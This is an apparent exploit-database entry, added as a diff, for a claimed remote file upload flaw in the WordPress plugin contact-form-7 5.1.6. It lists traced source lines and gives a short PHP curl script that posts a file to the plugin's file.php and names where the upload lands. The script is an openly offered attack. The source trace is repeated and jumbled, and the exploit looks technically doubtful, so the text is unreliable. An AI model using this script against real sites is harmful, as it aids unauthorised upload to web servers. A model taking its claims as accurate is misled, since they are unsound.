@@ -1,0 +1,39 @@
+#  Tile: Wordpress Plugin contact-form-7 5.1.6 - Remote File Upload
+#  Author: mehran feizi
+#  Category: webapps
+#  Date: 2020-02-11
+#  vendor home page: https://wordpress.org/plugins/contact-form-7/
+
+Vulnerable Source:
+134: move_uploaded_file move_uploaded_file($file['tmp_name'], $new_file))
+82: $file = $_FILES[$name] : null; 
+132: $new_file = path_join($uploads_dir, $filename); 
+122: $uploads_dir = wpcf7_maybe_add_random_dir($uploads_dir); 
+121: $uploads_dir = wpcf7_upload_tmp_dir(); 
+131: $filename = wp_unique_filename($uploads_dir, $filename); 
+122: $uploads_dir = wpcf7_maybe_add_random_dir($uploads_dir); 
+121: $uploads_dir = wpcf7_upload_tmp_dir(); 
+128: $filename = apply_filters('wpcf7_upload_file_name', $filename, $file['name'], $tag); 
+126: $filename = wpcf7_antiscript_file_name ($filename); 
+125: $filename = wpcf7_canonicalize ($filename, 'as-is'); 
+124: $filename = $file['name']; 
+82: $file = $_FILES[$name] : null; 
+82: $file = $_FILES[$name] : null; 
+78: ⇓ function wpcf7_file_validation_filter($result, $tag)
+
+
+Exploit:
+<?php
+$shahab="file.jpg";
+$ch = curl_init("http://localhost/wordpress/wp-content/plugins/contact-form-7/modules/file.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('zip'=>"@$shahab"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($ch);
+curl_close($ch);
+print "$result";
+?>
+
+Location File:
+http://localhost/wordpress/wp-content/plugins/contact-form-7/file.jpg
